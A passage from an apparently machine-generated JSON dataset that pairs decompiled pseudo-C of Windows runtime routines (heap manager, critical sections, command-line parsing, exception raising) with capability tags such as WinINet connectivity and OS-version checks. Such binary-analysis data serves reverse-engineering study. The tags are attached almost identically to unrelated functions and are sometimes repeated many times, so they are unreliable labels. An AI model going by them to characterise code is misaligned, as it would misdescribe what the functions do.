            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00401d3c(void)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint *puVar3;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint *var_8h;\n    uint *hMem;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*0x4855c4 == '\\0') {\n        return;\n    }\n    uStack20 = 0x401e30;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puVar1 = &stack0xfffffffc;\n    if (*0x48504d != '\\0') {\n        sub.kernel32.dll_EnterCriticalSection(0x4855cc);\n        puVar1 = puStack16;\n    }\n    puStack16 = puVar1;\n    *0x4855c4 = 0;\n    puVar3 = *0x485624;\n    sub.kernel32.dll_LocalFree();\n    *0x485624 = NULL;\n    for (var_8h = *0x4855ec; var_8h != 0x4855ec; var_8h = *var_8h) {\n        puVar3 = var_8h[2];\n        sub.kernel32.dll_VirtualFree();\n    }\n    fcn.004014e0();\n    fcn.004014e0();\n    fcn.004014e0();\n    puVar2 = *0x4855e4;\n    while (hMem = puVar2,  hMem != NULL) {\n        *0x4855e4 = *hMem;\n        sub.kernel32.dll_LocalFree();\n        puVar2 = *0x4855e4;\n        puVar3 = hMem;\n    }\n    *0x4855e4 = hMem;\n    *in_FS_OFFSET = puVar3;\n    uStack24 = 0x401e37;\n    if (*0x48504d != '\\0') {\n        sub.kernel32.dll_LeaveCriticalSection(0x4855cc);\n    }\n    sub.kernel32.dll_DeleteCriticalSection(0x4855cc);\n    return;\n}\n",
        "token_count": 483
    },
    "00402054": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402054(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar2 = 0;\n    iVar1 = fcn.00401ed0();\n    if (iVar1 != 0) {\n        if (in_EAX - *(iVar1 + 8) < 0xc) {\n            fcn.00401bd0();\n        }\n        else {\n            fcn.00401bd0();\n        }\n        if (iStack28 != 0) {\n            fcn.00401f14();\n            if (iStack28 + iStack24 < *(iVar1 + 8) + *(iVar1 + 0xc)) {\n                fcn.00401f74();\n            }\n            fcn.00401600();\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 210
    },
    "00402110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402110(uint param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    char cVar4;\n    int32_t **in_EAX;\n    \n    in_EAX[2] = param_2;\n    *(in_EAX + param_2 + -4) = param_2;\n    if (param_2 < 0x1001) {\n        if (param_2 < 0) {\n            param_2 = param_2 + 3;\n        }\n        ppiVar1 = *(*0x485624 + -0xc + (param_2 >> 2) * 4);\n        if (ppiVar1 == NULL) {\n            *(*0x485624 + -0xc + (param_2 >> 2) * 4) = in_EAX;\n            in_EAX[1] = in_EAX;\n            *in_EAX = in_EAX;\n        }\n        else {\n            piVar2 = *ppiVar1;\n            in_EAX[1] = ppiVar1;\n            *in_EAX = piVar2;\n            *ppiVar1 = in_EAX;\n            piVar2[1] = in_EAX;\n        }\n    }\n    else {\n        if ((0x3bff < param_2) && (cVar4 = fcn.00402054(),  cVar4 != '\\0')) {\n            return;\n        }\n        ppiVar1 = *0x485618;\n        piVar2 = **0x485618;\n        ppiVar3 = in_EAX;\n        in_EAX[1] = *0x485618;\n        *0x485618 = ppiVar3;\n        *in_EAX = piVar2;\n        *ppiVar1 = in_EAX;\n        piVar2[1] = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 427
    },
    "00402208": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402208(void)\n\n{\n    if (0 < *0x48561c) {\n        if (*0x48561c < 0xc) {\n            *0x4855c8 = 7;\n        }\n        else {\n            **0x485620 = *0x48561c | 2;\n            fcn.00401f50();\n            *0x485620 = NULL;\n            *0x48561c = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "004022e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.004022e0(void)\n\n{\n    uint uVar1;\n    int32_t iStack12;\n    uint uStack8;\n    \n    fcn.004019e4();\n    if (iStack12 != 0) {\n        uVar1 = fcn.00402254();\n        if (uVar1 != '\\0') {\n            uVar1 = CONCAT31(uVar1 >> 8, 1);\n            goto code_r0x00402307;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00402307:\n    return CONCAT44(uStack8, uVar1);\n}\n",
        "token_count": 136
    },
    "0040230c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040230c(void)\n\n{\n    uint uVar1;\n    int32_t iStack16;\n    uint uStack12;\n    \n    fcn.00401a8c();\n    if (iStack16 != 0) {\n        uVar1 = fcn.00402254();\n        if (uVar1 != '\\0') {\n            uVar1 = CONCAT31(uVar1 >> 8, 1);\n            goto code_r0x00402338;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00402338:\n    return CONCAT44(uStack12, uVar1);\n}\n",
        "token_count": 137
    },
    "00402340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00402340(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack4;\n    \n    iStack4 = 0;\n    if (in_EAX < 0) {\n        in_EAX = in_EAX + 3;\n    }\n    iVar1 = in_EAX >> 2;\n    if (iVar1 < 0x401) {\n        do {\n            iStack4 = *(*0x485624 + -0xc + iVar1 * 4);\n            if (iStack4 != 0) break;\n            iVar1 = iVar1 + 1;\n        } while (iVar1 != 0x401);\n    }\n    return CONCAT44(iStack4, iStack4);\n}\n",
        "token_count": 164
    },
    "00402378": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.00402378(void)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t *puStack20;\n    \n    while (puStack20 = *0x485610,  puVar1 = *0x485618,  (*0x485610)[2] < in_EAX) {\n        puStack20 = *0x485618;\n        uVar3 = (*0x485618)[2];\n        if (in_EAX <= uVar3) break;\n        (*0x485618)[2] = in_EAX;\n        do {\n            puStack20 = puStack20[1];\n        } while (puStack20[2] < in_EAX);\n        (*0x485618)[2] = uVar3;\n        puVar1 = puStack20;\n        if ((puStack20 != *0x485618) ||\n           ((in_EAX < 0x1001 && (puStack20 = fcn.00402340(),  puVar1 = *0x485618,  puStack20 != NULL)))) break;\n        cVar2 = fcn.004022e0();\n        puVar1 = *0x485620;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        if (in_EAX <= *0x48561c) {\n            *0x48561c = *0x48561c - in_EAX;\n            if (*0x48561c < 0xc) {\n                in_EAX = in_EAX + *0x48561c;\n                *0x48561c = 0;\n            }\n            *0x485620 = *0x485620 + in_EAX;\n            *puVar1 = in_EAX | 2;\n            *0x4855b4 = *0x4855b4 + 1;\n            *0x4855b8 = *0x4855b8 + (in_EAX - 4);\n            return puVar1 + 1;\n        }\n    }\n    *0x485618 = puVar1;\n    fcn.00401e3c();\n    uVar3 = puStack20[2];\n    if (uVar3 - in_EAX < 0xc) {\n        if (puStack20 == *0x485618) {\n            *0x485618 = puStack20[1];\n        }\n        *(puStack20 + uVar3) = *(puStack20 + uVar3) & 0xfffffffe;\n    }\n    else {\n        fcn.00402110();\n        uVar3 = in_EAX;\n    }\n    *puStack20 = uVar3 | 2;\n    *0x4855b4 = *0x4855b4 + 1;\n    *0x4855b8 = *0x4855b8 + (uVar3 - 4);\n    return puStack20 + 1;\n}\n",
        "token_count": 656
    },
    "004024c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.004024c0(void)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4855c4 == '\\0') {\n        puStack32 = 0x4024d7;\n        cVar2 = fcn.00401c64();\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    if (0x7ffffff8 < in_EAX) {\n        return NULL;\n    }\n    uStack36 = 0x40265c;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    if (*0x48504d != '\\0') {\n        uStack44 = 0x4855cc;\n        puStack32 = &stack0xfffffffc;\n        sub.kernel32.dll_EnterCriticalSection();\n    }\n    puVar5 = *0x485620;\n    uVar6 = in_EAX + 7U & 0xfffffffc;\n    if (uVar6 < 0xc) {\n        uVar6 = 0xc;\n    }\n    if (uVar6 < 0x1001) {\n        uVar3 = uVar6;\n        if (uVar6 < 0) {\n            uVar3 = uVar6 + 3;\n        }\n        iVar4 = uVar3 >> 2;\n        puVar1 = *(*0x485624 + -0xc + iVar4 * 4);\n        if (puVar1 != NULL) {\n            *(puVar1 + uVar6) = *(puVar1 + uVar6) & 0xfffffffe;\n            puVar5 = puVar1[1];\n            if (puVar5 == puVar1) {\n                *(*0x485624 + -0xc + iVar4 * 4) = 0;\n            }\n            else {\n                *(*0x485624 + -0xc + iVar4 * 4) = puVar5;\n                uVar3 = *puVar1;\n                *(uVar3 + 4) = puVar5;\n                *puVar5 = uVar3;\n            }\n            *puVar1 = puVar1[2] | 2;\n            *0x4855b4 = *0x4855b4 + 1;\n            *0x4855b8 = *0x4855b8 + (uVar6 - 4);\n            fcn.0040406c();\n            return puVar1 + 1;\n        }\n    }\n    if (*0x48561c < uVar6) {\n        fcn.00402378();\n        puVar5 = NULL;\n        *in_FS_OFFSET = uStack44;\n        uStack36 = 0x402663;\n        if (*0x48504d != '\\0') {\n            uStack40 = 0x4855cc;\n            puVar5 = sub.kernel32.dll_LeaveCriticalSection();\n        }\n        return puVar5;\n    }\n    *0x48561c = *0x48561c - uVar6;\n    if (*0x48561c < 0xc) {\n        uVar6 = uVar6 + *0x48561c;\n        *0x48561c = 0;\n    }\n    *0x485620 = *0x485620 + uVar6;\n    *puVar5 = uVar6 | 2;\n    *0x4855b4 = *0x4855b4 + 1;\n    *0x4855b8 = *0x4855b8 + (uVar6 - 4);\n    fcn.0040406c();\n    return puVar5 + 1;\n}\n",
        "token_count": 919
    },
    "00402a48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402a48(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4855c4 == '\\0') {\n        puStack24 = 0x402a62;\n        cVar1 = fcn.00401c64();\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n    }\n    uStack28 = 0x402b01;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*0x48504d != '\\0') {\n        uStack36 = 0x4855cc;\n        puStack24 = &stack0xfffffffc;\n        sub.kernel32.dll_EnterCriticalSection();\n    }\n    cVar1 = fcn.00402844();\n    if ((cVar1 == '\\0') && (iVar2 = fcn.004024c0(),  iVar2 != 0)) {\n        fcn.00402d34();\n        fcn.0040266c();\n    }\n    uVar3 = 0;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x402b08;\n    if (*0x48504d != '\\0') {\n        uStack32 = 0x4855cc;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n    }\n    return uVar3;\n}\n",
        "token_count": 369
    },
    "00402b14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00402b14(uint param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX < 1) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = (**0x483040)(param_1);\n        if (iVar1 == 0) {\n            fcn.00402c94();\n        }\n    }\n    return CONCAT44(iVar1, iVar1);\n}\n",
        "token_count": 105
    },
    "00402c94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402c94(void)\n\n{\n    uint8_t in_AL;\n    \n    if (*0x485008 != NULL) {\n        (**0x485008)();\n    }\n    if ((in_AL & 0x7f) == 0) {\n        fcn.004069e0();\n    }\n    fcn.00402c3c();\n    return;\n}\n",
        "token_count": 82
    },
    "00402bb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402bb4(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.004069e0();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.004069e0();\n        return *(*piVar1 + 8);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00402bd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00402bd4(uint param_1)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    \n    piVar1 = fcn.004069e0(param_1);\n    if (*piVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        piVar1 = fcn.004069e0(param_1);\n        uVar2 = *(*piVar1 + 4);\n    }\n    return CONCAT44(uVar2, uVar2);\n}\n",
        "token_count": 117
    },
    "00402ca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c75)\n// WARNING: Removing unreachable block (ram,0x00402c7a)\n\nvoid __fastcall fcn.00402ca0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004069e0(param_1, param_2);\n    if (*(iVar1 + 4) != 0) {\n        if (*0x485008 != NULL) {\n            (**0x485008)();\n        }\n        fcn.004069e0();\n        fcn.00402c3c();\n        return;\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00402d74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * fcn.00402d74(void)\n\n{\n    uint8_t *in_EAX;\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    \n    while( true ) {\n        while ((*in_EAX != 0 && (*in_EAX < 0x21))) {\n            in_EAX = sub.user32.dll_CharNextA();\n        }\n        puVar1 = in_EAX;\n        if ((*in_EAX != 0x22) || (in_EAX[1] != 0x22)) break;\n        in_EAX = in_EAX + 2;\n    }\n    while (puVar4 = puVar1,  0x20 < *puVar4) {\n        if (*puVar4 == 0x22) {\n            for (puVar1 = sub.user32.dll_CharNextA(puVar4); (*puVar1 != 0 && (*puVar1 != 0x22));\n                puVar1 = sub.user32.dll_CharNextA(puVar4, puVar1)) {\n            }\n            if (*puVar1 != 0) {\n                puVar1 = sub.user32.dll_CharNextA(puVar4, puVar1);\n            }\n        }\n        else {\n            puVar1 = sub.user32.dll_CharNextA();\n        }\n    }\n    fcn.00404c14();\n    iVar3 = 0;\n    puVar1 = in_EAX;\n    while (puVar4 = puVar1,  0x20 < *puVar4) {\n        if (*puVar4 == 0x22) {\n            puVar1 = sub.user32.dll_CharNextA(puVar4);\n            while ((*puVar1 != 0 && (*puVar1 != 0x22))) {\n                puVar2 = sub.user32.dll_CharNextA(puVar4);\n                for (; puVar1 < puVar2; puVar1 = puVar1 + 1) {\n                    in_EAX[iVar3] = *puVar1;\n                    iVar3 = iVar3 + 1;\n                }\n            }\n            if (*puVar1 != 0) {\n                puVar1 = sub.user32.dll_CharNextA(puVar4, puVar1);\n            }\n        }\n        else {\n            puVar2 = sub.user32.dll_CharNextA();\n            for (; puVar1 = puVar4,  puVar4 < puVar2; puVar4 = puVar4 + 1) {\n                in_EAX[iVar3] = *puVar4;\n                iVar3 = iVar3 + 1;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 591
    },
    "00402ed8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402ed8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack272 [264];\n    \n    fcn.004045c8();\n    if (in_EAX == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(0, auStack272, 0x105);\n        fcn.004046b8();\n    }\n    else {\n        uVar1 = sub.kernel32.dll_GetCommandLineA();\n        while( true ) {\n            uVar1 = fcn.00402d74(uVar1);\n            if ((in_EAX == 0) || (*param_2 == 0)) break;\n            in_EAX = in_EAX + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "004038d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004038d4(int32_t **param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x403962;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = NULL;\n    iVar1 = fcn.00403974();\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x14) == 0) {\n            fcn.004038a4();\n            fcn.004062b0();\n        }\n        else {\n            piVar2 = *(iVar1 + 0x14) + in_EAX;\n            *param_1 = piVar2;\n            if (piVar2 != NULL) {\n                (**(**param_1 + 4))(*param_1);\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x403969;\n    uStack32 = 0x403961;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 301
    },
    "00403a28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403a28(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    uchar in_ZF;\n    \n    fcn.004039f8(param_1);\n    if (!in_ZF) {\n    // WARNING: Could not recover jumptable at 0x00403a35. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    if (*0x48502c != NULL) {\n        (**0x48502c)();\n    }\n    *0x483004 = param_2;\n    *0x483000 = 0xd2;\n    fcn.004044d0(param_3, param_4, param_5);\n    return;\n}\n",
        "token_count": 196
    },
    "00403bd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403bd0(void)\n\n{\n    if (1 < *0x48302c) {\n        (**0x485014)(0xeedfadf, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00403bec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403bec(uint param_1, uint param_2)\n\n{\n    uint auStack12 [3];\n    \n    if (*0x48302c != '\\0') {\n        auStack12[0] = param_2;\n        (**0x485014)(0xeedfae4, 0, 2, auStack12);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00403c28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00403c28(void)\n\n{\n    uint in_EAX;\n    int32_t unaff_EBX;\n    uint uVar1;\n    uint auStack8 [2];\n    \n    if (1 < *0x48302c) {\n        auStack8[0] = *(unaff_EBX + 4);\n        uVar1 = 0;\n        (**0x485014)(0xeedfae0, 0, 1, auStack8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 119
    },
    "00403c3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00403c3c(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    if (1 < *0x48302c) {\n        uVar1 = 0;\n        (**0x485014)(0xeedfae0, 0, 1, &stack0xfffffff8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 89
    },
    "00403c70": {
        "rules": [
